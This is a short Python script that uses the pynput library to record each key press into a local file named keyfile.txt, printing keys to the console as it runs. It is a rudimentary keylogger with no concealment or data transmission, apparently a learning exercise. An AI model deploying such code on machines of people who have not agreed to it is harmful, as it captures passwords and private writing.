from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            if hasattr(key, 'char') and key.char is not None:
                logKey.write(key.char)
            else:
                if key == keyboard.Key.space:
                    logKey.write(' ')
                elif key not in [keyboard.Key.space, keyboard.Key.enter, keyboard.Key.backspace, keyboard.Key.tab]:
                    logKey.write(f'[{str(key)}]')
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input("Press Enter to stop...")
